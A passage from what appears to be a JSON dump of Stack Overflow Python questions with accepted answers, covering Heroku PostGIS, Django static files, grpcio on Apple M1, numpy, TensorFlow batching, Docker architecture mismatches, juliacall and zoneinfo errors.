(bool): A boolean value for if the episode has ended, in which case further :meth:`step` calls will return undefined results.\n               A done signal may be emitted for different reasons: >Maybe the task underlying the environment was solved successfully,\n               a certain timelimit was exceeded, or the physics >simulation has entered an invalid state.\n\n\nIt appears that the first boolean represents a terminated value, i.e. \"whether a terminal state (as defined under the MDP of the task) is reached. In this case further step() calls could return undefined results.\"\nIt appears that the second represents whether the value has been truncated, i.e. did your agent go out of bounds or not? From the docstring:\n\n\"whether a truncation condition outside the scope of the MDP is satisfied. Typically a timelimit, but could also be used to indicate agent physically going out of bounds. Can be used to end the episode prematurely before a terminal state is reached.\"\n\n"
}
{
    "Id": 73206939,
    "PostTypeId": 1,
    "Title": "Heroku postgres postgis - django releases fail with: relation \"spatial_ref_sys\" does not exist",
    "Body": "Heroku changed their PostgreSQL extension schema management on 01 August 2022. (https://devcenter.heroku.com/changelog-items/2446)\nSince then every deployment to Heroku of our existing django 4.0 application fails during the release phase, the build succeeds.\nHas anyone experienced the same issue?\nIs there a workaround to push new release to Heroku except reinstalling the postgis extension?\nIf I understand the changes right, Heroku added a schema called \"heroku_ext\" for newly created extensions. As the extension is existing in our case, it should not be affected.\n\nAll currently installed extensions will continue to work as intended.\n\nFollowing the full logs of an release via git push:\ngit push staging develop:master\nGesamt 0 (Delta 0), Wiederverwendet 0 (Delta 0), Pack wiederverwendet 0\nremote: Compressing source files... done.\nremote: Building source:\nremote: \nremote: -----> Building on the Heroku-20 stack\nremote: -----> Using buildpacks:\nremote:        1. https://github.com/heroku/heroku-geo-buildpack.git\nremote:        2. heroku/python\nremote: -----> Geo Packages (GDAL/GEOS/PROJ) app detected\nremote: -----> Installing GDAL-2.4.0\nremote: -----> Installing GEOS-3.7.2\nremote: -----> Installing PROJ-5.2.0\nremote: -----> Python app detected\nremote: -----> Using Python version specified in runtime.txt\nremote: -----> No change in requirements detected, installing from cache\nremote: -----> Using cached install of python-3.9.13\nremote: -----> Installing pip 22.1.2, setuptools 60.10.0 and wheel 0.37.1\nremote: -----> Installing SQLite3\nremote: -----> Installing requirements with pip\nremote: -----> Skipping Django collectstatic since the env var DISABLE_COLLECTSTATIC is set.\nremote: -----> Discovering process types\nremote:        Procfile declares types -> release, web, worker\nremote: \nremote: -----> Compressing...\nremote:        Done: 156.1M\nremote: -----> Launching...\nremote:  !     Release command declared: this new release will not be available until the command succeeds.\nremote:        Released v123\nremote:        https://myherokuapp.herokuapp.com/ deployed to Heroku\nremote: \nremote: This app is using the Heroku-20 stack, however a newer stack is available.\nremote: To upgrade to Heroku-22, see:\nremote: https://devcenter.heroku.com/articles/upgrading-to-the-latest-stack\nremote: \nremote: Verifying deploy... done.\nremote: Running release command...\nremote: \nremote: Traceback (most recent call last):\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py\", line 87, in _execute\nremote:     return self.cursor.execute(sql)\nremote: psycopg2.errors.UndefinedTable: relation \"spatial_ref_sys\" does not exist\nremote: \nremote: \nremote: The above exception was the direct cause of the following exception:\nremote: \nremote: Traceback (most recent call last):\nremote:   File \"/app/manage.py\", line 22, in \nremote:     main()\nremote:   File \"/app/manage.py\", line 18, in main\nremote:     execute_from_command_line(sys.argv)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/__init__.py\", line 446, in execute_from_command_line\nremote:     utility.execute()\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/__init__.py\", line 440, in execute\nremote:     self.fetch_command(subcommand).run_from_argv(self.argv)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/base.py\", line 414, in run_from_argv\nremote:     self.execute(*args, **cmd_options)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/base.py\", line 460, in execute\nremote:     output = self.handle(*args, **options)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/base.py\", line 98, in wrapped\nremote:     res = handle_func(*args, **kwargs)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/commands/migrate.py\", line 106, in handle\nremote:     connection.prepare_database()\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/contrib/gis/db/backends/postgis/base.py\", line 26, in prepare_database\nremote:     cursor.execute(\"CREATE EXTENSION IF NOT EXISTS postgis\")\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/sentry_sdk/integrations/django/__init__.py\", line 544, in execute\nremote:     return real_execute(self, sql, params)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py\", line 67, in execute\nremote:     return self._execute_with_wrappers(\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py\", line 80, in _execute_with_wrappers\nremote:     return executor(sql, params, many, context)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py\", line 89, in _execute\nremote:     return self.cursor.execute(sql, params)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/utils.py\", line 91, in __exit__\nremote:     raise dj_exc_value.with_traceback(traceback) from exc_value\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py\", line 87, in _execute\nremote:     return self.cursor.execute(sql)\nremote: django.db.utils.ProgrammingError: relation \"spatial_ref_sys\" does not exist\nremote: \nremote: Sentry is attempting to send 2 pending error messages\nremote: Waiting up to 2 seconds\nremote: Press Ctrl-C to quit\nremote: Waiting for release.... failed.\nTo https://git.heroku.com/myherokuapp\n\n",
    "AcceptedAnswerId": 73220201,
    "AcceptedAnswer": "I've worked around it by overwriting the postgis/base.py engine, I've put the following in my app under db/base.py\nfrom django.contrib.gis.db.backends.postgis.base import (\n     DatabaseWrapper as PostGISDatabaseWrapper,\n)\n\nclass DatabaseWrapper(PostGISDatabaseWrapper):\n    def prepare_database(self):\n        # This is the overwrite - we don't want to call the\n        # super() because of a faulty extension creation\n     pass\n\nThen in my settings I've just pointed the DATABASES[\"engine\"] = \"app.db\"\nIt won't help with backups but at least I can release again.\n"
}
{
    "Id": 74819091,
    "PostTypeId": 1,
    "Title": "Single \"=\" after dependency version specifier in setup.py",
    "Body": "I'm looking at a setup.py with this syntax:\nfrom setuptools import setup\n\nsetup(\n...\n    tests_require=[\"h5py>=2.9=mpi*\",\n                   \"mpi4py\"]\n)\n\nI understand the idea of the \">=\" where h5py should be at least version 2.9, but I cannot for the life of me understand the =mpi* afterwards. Is it saying the version should somehow match the mpi version, while also being at least 2.9?\nI can't find anything that explains specifying python package versions that also explains the use of a single =.\nThe only other place I've found it used is some obscure blog post that seemed to imply it was sort of like importing the package with an alias, which doesn't make much sense to me; and also the mpi4py docs that include a command line snippet conda install -c conda-forge h5py=*=mpi* netcdf4=*=mpi* but don't really explain it.\n",
    "AcceptedAnswerId": 74819586,
    "AcceptedAnswer": "Short answer\nThe =mpi* qualifier says that you want to install h5py pre-compiled with MPI support.\nDetails\nIf you look at the documentation for h5py, you'll see references to having to build it with or without MPI explicitly (e.g., see https://docs.h5py.org/en/latest/build.html).\nWhen you look at the conda-forge download files (https://anaconda.org/conda-forge/h5py/files) you'll also see that there are a bunch of nompi variants and a bunch of mpi variants.\nAdding =mpi* triggers getting a version that's been compiled with MPI so that you get parallel MPI support, while I suspect the default version would come without MPI support.\nExperimentation with and without\nWhen I do conda install -c conda-forge h5py=3.7, conda proposes to download this bundle:\nh5py-3.7.0-nompi_py39hd4deaf1_100\n\nBut when I did conda install =c conda-forget h5py=3.7=mpi*, I expected a ...-mpi_py... bundle but instead it just failed because I'm on Windows and MPI is not supported on Windows as far as I can tell. (And that makes sense, HPC clusters with MPI run on Linux.)\n"
}
{
    "Id": 73406581,
    "PostTypeId": 1,
    "Title": "python manage.py collectstatic error: cannot find rest_framework bootstrap.min.css.map (from book 'Django for APIs')",
    "Body": "I am reading the book 'Django for APIs' from 'William S. Vincent' (current edition for Django 4.0)\nIn chapter 4, I cannot run successfully the command python manage.py collectstatic.\nI get the following error:\nTraceback (most recent call last):\n  File \"/Users/my_name/Projects/django/django_for_apis/library/manage.py\", line 22, in \n    main()\n  File \"/Users/my_name/Projects/django/django_for_apis/library/manage.py\", line 18, in main\n    execute_from_command_line(sys.argv)\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/__init__.py\", line 446, in execute_from_command_line\n    utility.execute()\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/__init__.py\", line 440, in execute\n    self.fetch_command(subcommand).run_from_argv(self.argv)\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/base.py\", line 402, in run_from_argv\n    self.execute(*args, **cmd_options)\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/base.py\", line 448, in execute\n    output = self.handle(*args, **options)\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/contrib/staticfiles/management/commands/collectstatic.py\", line 209, in handle\n    collected = self.collect()\n  File \"/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/contrib/staticfiles/management/commands/collectstatic.py\", line 154, in collect\n    raise processed\nwhitenoise.storage.MissingFileError: The file 'rest_framework/css/bootstrap.min.css.map' could not be found with .\n\nThe CSS file 'rest_framework/css/bootstrap.min.css' references a file which could not be found:\n  rest_framework/css/bootstrap.min.css.map\n\nPlease check the URL references in this CSS file, particularly any\nrelative paths which might be pointing to the wrong location. \n\nI have the exact same settings like in the book in settings.py:\nSTATIC_URL = \"static/\"\nSTATICFILES_DIRS = [BASE_DIR / \"static\"]  # new\nSTATIC_ROOT = BASE_DIR / \"staticfiles\"  # new\nSTATICFILES_STORAGE = \"whitenoise.storage.CompressedManifestStaticFilesStorage\"  # new\n\nI couldn't find any explanation for it. maybe someone can point me in the right direction.\n",
    "AcceptedAnswerId": 73411956,
    "AcceptedAnswer": "Update: DRF 3.14.0 now supports Django 4.1. If you've added stubs to static as per below, be sure to remove them.\nThis appears to be related to Django 4.1: either downgrade to Django 4.0 or simply create the following empty files in one of your static directories:\nstatic/rest_framework/css/bootstrap-theme.min.css.map\nstatic/rest_framework/css/bootstrap.min.css.map\n\nThere's a recent change to ManifestStaticFilesStorage where it now attempts to replace source maps with their hashed counterparts.\nDjango REST framework has only recently added the bootstrap css source maps but is not yet released.\n"
}
{
    "Id": 72620996,
    "PostTypeId": 1,
    "Title": "Apple M1 - Symbol not found: _CFRelease while running Python app",
    "Body": "I am hoping to run my app without any problem, but I got this attached error. Could someone help or point me into the right direction as to why this is happening?\nTraceback (most recent call last):\n  File \"/Users/andre.sitorus/Documents/GitHub/nexus/automation-api/app/main.py\", line 4, in \n    from configurations import config  # noqa # pylint: disable=unused-import\n  File \"/Users/andre.sitorus/Documents/GitHub/nexus/automation-api/app/configurations/config.py\", line 7, in \n    from google.cloud import secretmanager\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/cloud/secretmanager.py\", line 20, in \n    from google.cloud.secretmanager_v1 import SecretManagerServiceClient\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/cloud/secretmanager_v1/__init__.py\", line 24, in \n    from google.cloud.secretmanager_v1.gapic import secret_manager_service_client\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/cloud/secretmanager_v1/gapic/secret_manager_service_client.py\", line 25, in \n    import google.api_core.gapic_v1.client_info\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/api_core/gapic_v1/__init__.py\", line 18, in \n    from google.api_core.gapic_v1 import config\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/api_core/gapic_v1/config.py\", line 23, in \n    import grpc\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/__init__.py\", line 22, in \n    from grpc import _compression\n  File \"/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_compression.py\", line 15, in \n    from grpc._cython import cygrpc\nImportError: dlopen(/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_cython/cygrpc.cpython-39-darwin.so, 2): Symbol not found: _CFRelease\n  Referenced from: /Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_cython/cygrpc.cpython-39-darwin.so\n  Expected in: flat namespace\n in /Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_cython/cygrpc.cpython-39-darwin.so\n\nI'm running  this in Apple M1.\nI already upgraded pip and setuptools before installing all the requirements in my virtual environment using conda. Here is my python, pip, and setuptools version:\npython 3.9.12\npip 21.2.4\nsetuptools 62.4.0\n\n",
    "AcceptedAnswerId": 73245207,
    "AcceptedAnswer": "Had the same issue; turned out it's because of the grpcio build. Doing this helped:\npip uninstall grpcio\nconda install grpcio\n\n(Make sure you use the conda-forge channel with conda; the community puts in work to make sure packages play well with M1/arm64)\n"
}
{
    "Id": 74842741,
    "PostTypeId": 1,
    "Title": "Why is a combination of numpy functions faster than np.mean?",
    "Body": "I am wondering what the fastest way for a mean computation is in numpy. I used the following code to experiment with it:\nimport time\nn = 10000\np = np.array([1] * 1000000)\n\nt1 = time.time()\nfor x in range(n):\n    np.divide(np.sum(p), p.size)\nt2 = time.time()\n\nprint(t2-t1)\n\n3.9222593307495117\nt3 = time.time()\nfor x in range(n):\n    np.mean(p)\nt4 = time.time()\n\nprint(t4-t3)\n\n5.271147012710571\nI would assume that np.mean would be faster or at least equivalent in speed, however it looks like the combination of numpy functions is faster than np.mean. Why is the combination of numpy functions faster?\n",
    "AcceptedAnswerId": 74842967,
    "AcceptedAnswer": "For integer input, by default, numpy.mean computes the sum in float64 dtype. This prevents overflow errors, but it requires a conversion for every element.\nYour code with numpy.sum only converts once, after the sum has been computed.\n"
}
{
    "Id": 73821277,
    "PostTypeId": 1,
    "Title": "Generate Permutation With Minimum Guaranteed Distance from Elements in Source",
    "Body": "Given a sequence a with n unique elements, I want to create a sequence b which is a randomly selected permutation of a such that there is at least a specified minimum distance d between duplicate elements of the sequence which is b appended to a.\nFor example, if a = [1,2,3] and d = 2, of the following permutations:\na         b\n[1, 2, 3] (1, 2, 3) mindist = 3\n[1, 2, 3] (1, 3, 2) mindist = 2\n[1, 2, 3] (2, 1, 3) mindist = 2\n[1, 2, 3] (2, 3, 1) mindist = 2\n[1, 2, 3] (3, 1, 2) mindist = 1\n[1, 2, 3] (3, 2, 1) mindist = 1\n\nb could only take one of the first four values since the minimum distance for the last two is 1 .\nI wrote the following implementation:\nimport random\nn = 10\nalist = list(range(n))\n\nblist = alist[:]\n\nd = n//2\n\navail_indices = list(range(n))\nfor a_ind, a_val in enumerate(reversed(alist)):\n  min_ind = max(d - a_ind - 1, 0)\n  new_ind = random.choice(avail_indices[min_ind:])\n  avail_indices.remove(new_ind)\n  blist[new_ind] = a_val\nprint(alist, blist)\n\n[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] [1, 3, 2, 8, 5, 6, 4, 0, 9, 7]\n\nbut I think this is n^2 time complexity (not completely sure). Here's a plot of the time required as n increases for d = n//2:\n\nIs it possible to do better than this?\n",
    "AcceptedAnswerId": 73821711,
    "AcceptedAnswer": "Yes, your implementation is O(n^2).\nYou can adapt the Fisher-Yates shuffle to this purpose.  What you do is work from the start of an array to the end, placing the final value into place out of the remaining.\nThe trick is that while in a full shuffle you can place any element at the start, you can only place from an index that respects the distance condition.\nHere is an implementation.\nimport random\n\ndef distance_permutation (orig, d):\n    answer = orig.copy()\n    for i in range(len(orig)):\n        choice = random.randrange(i, min(len(orig), len(orig) + i - d + 1))\n        if i < choice:\n            (answer[i], answer[choice]) = (answer[choice], answer[i])\n    return answer\n\n\nn = 10\nx = list(range(n))\nprint(x, distance_permutation(x, n//2))\n\n"
}
{
    "Id": 73464414,
    "PostTypeId": 1,
    "Title": "Why are generics in Python implemented using __class_getitem__ instead of __getitem__ on metaclass",
    "Body": "I was reading python documentation and peps and couldn't find an answer for this.\nGenerics in python are implemented by subscripting class objects. list[str] is a list where all elements are strings.\nThis behaviour is achieved by implementing a special (dunder) classmethod called __class_getitem__ which as the documentation states should return a GenericAlias.\nAn example:\nclass MyGeneric:\n    def __class_getitem__(cls, key):\n        # implement generics\n        ...\n\nThis seems weird to me because the documentation also shows some code similar to what the interpreter does when faced with subscripting objects and shows that defining both __getitem__ on object's metaclass and __class_getitem__ on the object itself always chooses the metaclass' __getitem__. This means that a class with the same functionality as the one above can be implemented without introducing a new special method into the language.\nAn example of a class with identical behaviour:\nclass GenericMeta(type):\n    def __getitem__(self, key):\n        # implement generics\n        ...\n\n\nclass MyGeneric(metaclass=GenericMeta):\n    ...\n\nLater the documentation also shows an example of Enums using a __getitem__ of a metaclass as an example of a __class_getitem__ not being called.\nMy question is why was the __class_getitem__ classmethod introduced in the first place?\nIt seems to do the exact same thing as the metaclass' __getitem__ but with the added complexity and the need for extra code in the interpreter for deciding which method to call. All of this comes with no extra benefit as defining both will simply call the same one every time unless specifically calling dunder methods (which should not be done in general).\nI know that implementing generics this way is discouraged. The general approach is to subclass a class that already defines a __class_getitem__ like typing.Generic but I'm still curious as to why that functionality was implemented that way.\n",
    "AcceptedAnswerId": 73464466,
    "AcceptedAnswer": "__class_getitem__ exists because using multiple inheritance where multiple metaclasses are involved is very tricky and sets limitations that can\u2019t always be met when using 3rd-party libraries.\nWithout __class_getitem__ generics requires a metaclass, as defining a  __getitem__ method on a class would only handle attribute access on instances, not on the class. Normally, object[...] syntax is handled by the type of object, not by object itself. For instances, that's the class, but for classes, that's the metaclass.\nSo, the syntax:\nClassObject[some_type]\n\nwould translate to:\ntype(ClassObject).__getitem__(ClassObject, some_type)\n\n__class_getitem__ exists to avoid having to give every class that needs to support generics, a metaclass.\nFor how __getitem__ and other special methods work, see the Special method lookup section in the Python Datamodel chapter:\n\nFor custom classes, implicit invocations of special methods are only guaranteed to work correctly if defined on an object\u2019s type, not in the object\u2019s instance dictionary.\n\nThe same chapter also explicitly covers __class_getitem__ versus __getitem__:\n\nUsually, the subscription of an object using square brackets will call the __getitem__() instance method defined on the object\u2019s class. However, if the object being subscribed is itself a class, the class method __class_getitem__() may be called instead.\n\nThis section also covers what will happen if the class has both a metaclass with a __getitem__ method, and a __class_getitem__ method defined on the class itself. You found this section, but it only applies in this specific corner-case.\nAs stated, using metaclasses can be tricky, especially when inheriting from classes with different metaclasses. See the original PEP 560 - Core support for typing module and generic types proposal:\n\nAll generic types are instances of GenericMeta, so if a user uses a custom metaclass, then it is hard to make a corresponding class generic. This is particularly hard for library classes that a user doesn\u2019t control.\n...\nWith the help of the proposed special attributes the GenericMeta metaclass will not be needed.\n\nWhen mixing multiple classes with different metaclasses, Python requires that the most specific metaclass derives from the other metaclasses, a requirement that can't easily be met if the metaclass is not your own; see the documentation on determining the appropriate metaclass.\nAs a side note, if you do use a metaclass, then __getitem__ should not be a classmethod:\nclass GenericMeta(type):\n    # not a classmethod! `self` here is a class, an instance of this\n    # metaclass.\n    def __getitem__(self, key):\n        # implement generics\n        ...\n\nBefore PEP 560, that's basically what the typing.GenericMeta metaclass did, albeit with a bit more complexity.\n"
}
{
    "Id": 73569804,
    "PostTypeId": 1,
    "Title": "Dataset.batch doesn't work as expected with a zipped dataset",
    "Body": "I have a dataset like this:\na = tf.data.Dataset.range(1, 16)\nb = tf.data.Dataset.range(16, 32)\nzipped = tf.data.Dataset.zip((a, b))\nlist(zipped.as_numpy_iterator())\n\n# output: \n[(0, 16),\n (1, 17),\n (2, 18),\n (3, 19),\n (4, 20),\n (5, 21),\n (6, 22),\n (7, 23),\n (8, 24),\n (9, 25),\n (10, 26),\n (11, 27),\n (12, 28),\n (13, 29),\n (14, 30),\n (15, 31)]\n\nWhen I apply batch(4) to it, the expected result is an array of batches, where each batch contains four tuples:\n[[(0, 16), (1, 17), (2, 18), (3, 19)],\n [(4, 20), (5, 21), (6, 22), (7, 23)],\n [(9, 24), (10, 25), (10, 26), (11, 27)],\n [(12, 28), (13, 29), (14, 30), (15, 31)]]\n\nBut this is what I receive instead:\nbatched = zipped.batch(4)\nlist(batched.as_numpy_iterator())\n\n# Output:\n[(array([0, 1, 2, 3]), array([16, 17, 18, 19])), \n (array([4, 5, 6, 7]), array([20, 21, 22, 23])), \n (array([ 8,  9, 10, 11]), array([24, 25, 26, 27])), \n (array([12, 13, 14, 15]), array([28, 29, 30, 31]))]\n\nI'm following this tutorial, he does the same steps but gets the correct output somehow.\n\nUpdate: according to the documentation this is the intended behavior:\n\nThe components of the resulting element will have an additional outer dimension, which will be batch_size\n\nBut it doesn't make any sense. To my understanding, dataset is a list of pieces of data. It doesn't matter the shape of those pieces of data, when we are batching it we are combining the elements [whatever their shape is] into batches, therefore it should always insert the new dimention to the second position ((length, a, b, c) -> (length', batch_size, a, b, c)).\nSo my questions are: I wonder what is the purpose of batch() being implemented this way? And what is the alternative that does what I described?\n",
    "AcceptedAnswerId": 73583522,
    "AcceptedAnswer": "One thing you can try doing is something like this:\nimport tensorflow as tf\n\na = tf.data.Dataset.range(16)\nb = tf.data.Dataset.range(16, 32)\nzipped = tf.data.Dataset.zip((a, b)).batch(4).map(lambda x, y: tf.transpose([x, y]))\n\nlist(zipped.as_numpy_iterator())\n\n[array([[ 0, 16],\n        [ 1, 17],\n        [ 2, 18],\n        [ 3, 19]]), \n array([[ 4, 20],\n        [ 5, 21],\n        [ 6, 22],\n        [ 7, 23]]), \n array([[ 8, 24],\n        [ 9, 25],\n        [10, 26],\n        [11, 27]]), \n array([[12, 28],\n        [13, 29],\n        [14, 30],\n        [15, 31]])]\n\nbut they are still not tuples. Or:\nzipped = tf.data.Dataset.zip((a, b)).batch(4).map(lambda x, y: tf.unstack(tf.transpose([x, y]), num = 4))\n\n[(array([ 0, 16]), array([ 1, 17]), array([ 2, 18]), array([ 3, 19])), (array([ 4, 20]), array([ 5, 21]), array([ 6, 22]), array([ 7, 23])), (array([ 8, 24]), array([ 9, 25]), array([10, 26]), array([11, 27])), (array([12, 28]), array([13, 29]), array([14, 30]), array([15, 31]))]\n\n"
}
{
    "Id": 73285601,
    "PostTypeId": 1,
    "Title": "Docker : exec /usr/bin/sh: exec format error",
    "Body": "Hi guys need some help.\nI created a custom docker image and push it to docker hub but when I run it in CI/CD it gives me this error.\nexec /usr/bin/sh: exec format error\nWhere :\nDockerfile\nFROM ubuntu:20.04\nRUN apt-get update\nRUN apt-get install -y software-properties-common\nRUN apt-get install -y python3-pip\nRUN pip3 install robotframework\n\n.gitlab-ci.yml\nrobot-framework:\n  image: rethkevin/rf:v1\n  allow_failure: true\n  script:\n    - ls\n    - pip3 --version\n\nOutput\nRunning with gitlab-runner 15.1.0 (76984217)\n  on runner zgjy8gPC\nPreparing the \"docker\" executor\nUsing Docker executor with image rethkevin/rf:v1 ...\nPulling docker image rethkevin/rf:v1 ...\nUsing docker image sha256:d2db066f04bd0c04f69db1622cd73b2fc2e78a5d95a68445618fe54b87f1d31f for rethkevin/rf:v1 with digest rethkevin/rf@sha256:58a500afcbd75ba477aa3076955967cebf66e2f69d4a5c1cca23d69f6775bf6a ...\nPreparing environment\n00:01\nRunning on runner-zgjy8gpc-project-1049-concurrent-0 via 1c8189df1d47...\nGetting source from Git repository\n00:01\nFetching changes with git depth set to 20...\nReinitialized existing Git repository in /builds/reth.bagares/test-rf/.git/\nChecking out 339458a3 as main...\nSkipping Git submodules setup\nExecuting \"step_script\" stage of the job script\n00:00\nUsing docker image sha256:d2db066f04bd0c04f69db1622cd73b2fc2e78a5d95a68445618fe54b87f1d31f for rethkevin/rf:v1 with digest rethkevin/rf@sha256:58a500afcbd75ba477aa3076955967cebf66e2f69d4a5c1cca23d69f6775bf6a ...\nexec /usr/bin/sh: exec format error\nCleaning up project directory and file based variables\n00:01\nERROR: Job failed: exit code 1\n\nany thoughts on this to resolve the error?\n",
    "AcceptedAnswerId": 73285704,
    "AcceptedAnswer": "The problem is that you built this image for arm64/v8 -- but your runner is using a different architecture.\nIf you run:\ndocker image inspect rethkevin/rf:v1\n\nYou will see this in the output:\n...\n        \"Architecture\": \"arm64\",\n        \"Variant\": \"v8\",\n        \"Os\": \"linux\",\n...\n\nTry building and pushing your image from your GitLab CI runner so the architecture of the image will match your runner's architecture.\nAlternatively, you can build for multiple architectures using docker buildx . Alternatively still, you could also run a GitLab runner on ARM architecture so that it can run the image for the architecture you built it on.\n"
}
{
    "Id": 74930922,
    "PostTypeId": 1,
    "Title": "How to load a custom Julia package in Python using Python's juliacall",
    "Body": "I already know How to import Julia packages into Python.\nHowever, now I have created my own simple Julia package with the following command:\nusing Pkg;Pkg.generate(\"MyPack\");Pkg.activate(\"MyPack\");Pkg.add(\"StatsBase\")\nwhere the file MyPack/src/MyPack.jl has the following contents:\nmodule MyPack\nusing StatsBase\n\nfunction f1(x, y)\n   return 3x + y\nend\ng(x) = StatsBase.std(x)\n\nexport f1\n\nend\n\nNow I would like to load this Julia package in Python via juliacall and call f1 and g functions.\nI have already run pip3 install juliacall from command line. How do I call the above functions from Python?\n",
    "AcceptedAnswerId": 74930923,
    "AcceptedAnswer": "You need to run the following code to load the MyPack package from Python via juliacall\nfrom juliacall import Main as jl\nfrom juliacall import Pkg as jlPkg\n\njlPkg.activate(\"MyPack\")  # relative path to the folder where `MyPack/Project.toml` should be used here \n\njl.seval(\"using MyPack\")\n\nNow you can use the function (note that calls to non exported functions require package name):\n>>> jl.f1(4,7)\n19\n\n>>> jl.f1([4,5,6],[7,8,9]).to_numpy()\narray([19, 23, 27], dtype=object)\n\n>>> jl.MyPack.g(numpy.arange(0,3))\n1.0\n\nNote another option for calling Julia from Python that seems to be more difficult to configure as of today is the pip install julia package which is described here: I have a high-performant function written in Julia, how can I use it from Python?\n"
}
{
    "Id": 73332533,
    "PostTypeId": 1,
    "Title": "Django 4 Error: 'No time zone found with key ...'",
    "Body": "After rebuild of my Django 4 Docker container the web service stopped working with this error:\n\nzoneinfo._common.ZoneInfoNotFoundError: 'No time zone found with key\nAsia/Hanoi'\n\nMy setup is:\n\nPython 3.10\nDjango 4.0.5\n\nError:\nweb_1              \nTraceback (most recent call last): web_1          \n  File \"/usr/local/lib/python3.10/zoneinfo/_common.py\", line 12, in load_tzdata web_1              \n    return importlib.resources.open_binary(package_name, resource_name) web_1     \n  File \"/usr/local/lib/python3.10/importlib/resources.py\", line 46, in open_binary web_1              \n    return reader.open_resource(resource) web_1              \n  File \"/usr/local/lib/python3.10/importlib/abc.py\", line 433, in open_resource web_1              \n    return self.files().joinpath(resource).open('rb') web_1              \n  File \"/usr/local/lib/python3.10/pathlib.py\", line 1119, in open web_1       \n    return self._accessor.open(self, mode, buffering, encoding, errors, web_1              \nFileNotFoundError: [Errno 2] No such file or directory: '/usr/local/lib/python3.10/site-packages/tzdata/zoneinfo/Asia/Hanoi' web_1              \n web_1              \nDuring handling of the above exception, another exception occurred: web_1              \n web_1              \nTraceback (most recent call last): web_1          \n  File \"/home/app/web/manage.py\", line 22, in  web_1         \n    main() web_1              \n  File \"/home/app/web/manage.py\", line 18, in main web_1              \n    execute_from_command_line(sys.argv) web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/core/management/__init__.py\", line 446, in execute_from_command_line web_1              \n    utility.execute() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/core/management/__init__.py\", line 420, in execute web_1              \n    django.setup() web_1     \n  File \"/usr/local/lib/python3.10/site-packages/django/__init__.py\", line 24, in setup web_1              \n    apps.populate(settings.INSTALLED_APPS) web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/apps/registry.py\", line 116, in populate web_1              \n    app_config.import_models() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/apps/config.py\", line 304, in import_models web_1              \n    self.models_module = import_module(models_module_name) web_1              \n  File \"/usr/local/lib/python3.10/importlib/__init__.py\", line 126, in import_module web_1              \n    return _bootstrap._gcd_import(name[level:], package, level) web_1              \n  File \"\", line 1050, in _gcd_import web_1              \n  File \"\", line 1027, in _find_and_load web_1              \n  File \"\", line 1006, in _find_and_load_unlocked web_1    \n  File \"\", line 688, in _load_unlocked web_1              \n  File \"\", line 883, in exec_module web_1              \n  File \"\", line 241, in _call_with_frames_removed web_1   \n  File \"/usr/local/lib/python3.10/site-packages/django_celery_beat/models.py\", line 8, in  web_1              \n    import timezone_field web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/__init__.py\", line 1, in  web_1              \n    from timezone_field.fields import TimeZoneField web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 11, in  web_1              \n    class TimeZoneField(models.Field): web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 41, in TimeZoneField web_1              \n    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 41, in  web_1              \n    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              \n  File \"/usr/local/lib/python3.10/zoneinfo/_common.py\", line 24, in load_tzdata web_1              \n    raise ZoneInfoNotFoundError(f\"No time zone found with key {key}\") web_1              \nzoneinfo._common.ZoneInfoNotFoundError: 'No time zone found with key Asia/Hanoi' web_1              \n[2022-08-12 09:18:36 +0000] [1] [INFO] Starting gunicorn 20.0.4 web_1              \n[2022-08-12 09:18:36 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1) web_1 \n[2022-08-12 09:18:36 +0000] [1] [INFO] Using worker: sync web_1      